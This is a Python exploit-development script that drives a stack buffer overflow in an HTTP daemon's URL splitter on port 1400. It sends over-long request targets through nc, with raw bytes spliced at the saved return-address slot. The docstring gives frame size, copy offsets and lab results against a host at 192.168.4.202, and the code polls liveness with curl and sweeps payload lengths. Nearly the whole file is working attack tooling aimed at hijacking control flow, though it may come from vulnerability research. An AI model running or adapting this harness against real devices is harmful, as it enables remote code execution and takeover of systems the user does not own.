#!/usr/bin/env python3
"""rawtarget.py - drive the 57.23 URL-span overflow with arbitrary raw bytes.

The splitter at 0x1007ad60 copies the raw request target into a 5344-byte frame
(dst r1+16, len = span-23, no bound, no canary). This tool sends a target built
from a filler plus optional raw (non-ASCII) bytes at chosen offsets, so the
saved-register / LR slots can be filled with real addresses instead of 0x41.

Python cannot connect to 192.168.4.0/24 from this host (EHOSTUNREACH), so the
transport is `nc` with the exact header set the daemon requires (a bare
HTTP/1.0 line answers 400; HTTP/1.1 + Host + User-Agent + Accept answers 404).

Liveness is polled on /status/zp through curl, before and after every shot, so a
daemon death is a fact rather than an inference from a dropped connection.

  ./rawtarget.py 192.168.4.202 --len 5359
  ./rawtarget.py 192.168.4.202 --len 5359 --at 5332 --bytes 1000755c
  ./rawtarget.py 192.168.4.202 --sweep 5300:5400:4

Offsets are counted from the start of the target (`/` is offset 0). The copy
destination is target byte 23 -> dst+0, so a saved slot at dst+K is target
offset K+23.

Measured 2026-10-27 on .202 with this tool, raw bytes at the LR slot (offset
5332): the answer flips 408 -> 000 (connection dies) in the band n=5336..5368
and back to 408 above it, but the **daemon never dies** - 0x2f2f2f2f in the LR
slot is survived exactly like 'A'. So the raw bytes do reach the slot (the
connection death is real) but the return path is not decisive yet; the open
question is whether the 408 path returns through the smashed frame at all.
"""
import argparse
import subprocess
import sys
import time

HDR = (
    "Host: {host}:1400\r\n"
    "User-Agent: curl/8.7.1\r\n"
    "Accept: */*\r\n"
    "\r\n"
)


def alive(host, timeout=2.0):
    r = subprocess.run(
        ["curl", "-s", "-m", str(timeout), "-o", "/dev/null", "-w", "%{http_code}",
         f"http://{host}:1400/status/zp"],
        capture_output=True, text=True,
    )
    return r.stdout.strip() == "200"


def wait_alive(host, limit=40.0):
    end = time.monotonic() + limit
    while time.monotonic() < end:
        if alive(host):
            return True
        time.sleep(0.3)
    return False


def send(host, target: bytes, timeout=8.0):
    """One raw request. Returns (code, elapsed, raw_first_line)."""
    req = b"GET " + target + b" HTTP/1.1\r\n" + HDR.format(host=host).encode()
    t0 = time.monotonic()
    p = subprocess.run(
        ["nc", "-w", str(int(timeout)), host, "1400"],
        input=req + b"\n",  # keep stdin open a moment so the daemon can answer
        capture_output=True,
        timeout=timeout + 4,
    )
    dt = time.monotonic() - t0
    line = p.stdout.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    code = 0
    parts = line.split()
    if len(parts) >= 2 and parts[1].isdigit():
        code = int(parts[1])
    return code, dt, line


def build(n, at=None, raw=b"", filler=b"A"):
    """Target of length n; `raw` is spliced at offset `at` (counted from 0)."""
    body = bytearray(filler * n)
    body[0:1] = b"/"
    if at is not None and raw:
        body[at:at + len(raw)] = raw
    return bytes(body)


def shot(host, n, at, raw, timeout):
    if not alive(host):
        print("  daemon down before the shot; waiting", flush=True)
        wait_alive(host)
    tgt = build(n, at, raw)
    code, dt, line = send(host, tgt, timeout)
    up = alive(host)
    print(f"  n={n:<6} at={at} raw={raw.hex() or '-':<10} code={code:<4} "
          f"{dt:6.3f}s alive={up} {line}", flush=True)
    if not up:
        wait_alive(host)
    return {"n": n, "at": at, "raw": raw.hex(), "code": code,
            "time": round(dt, 3), "alive": up}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--len", dest="n", type=int)
    ap.add_argument("--at", type=int, help="target offset for --bytes")
    ap.add_argument("--bytes", default="", help="hex raw bytes to splice")
    ap.add_argument("--sweep", help="lo:hi:step")
    ap.add_argument("--timeout", type=float, default=8.0)
    a = ap.parse_args()

    raw = bytes.fromhex(a.bytes) if a.bytes else b""
    if not alive(a.host):
        print(f"{a.host} not answering /status/zp", file=sys.stderr)
        return 2

    if a.sweep:
        lo, hi, step = (int(x) for x in a.sweep.split(":"))
        rows = [shot(a.host, n, a.at, raw, a.timeout) for n in range(lo, hi + 1, step)]
        dead = [r["n"] for r in rows if not r["alive"]]
        print(f"\nfirst dead: {dead[0] if dead else None}  ({len(dead)}/{len(rows)} shots)")
        return 0

    if a.n is None:
        ap.error("--len or --sweep is required")
    shot(a.host, a.n, a.at, raw, a.timeout)
    return 0


if __name__ == "__main__":
    sys.exit(main())
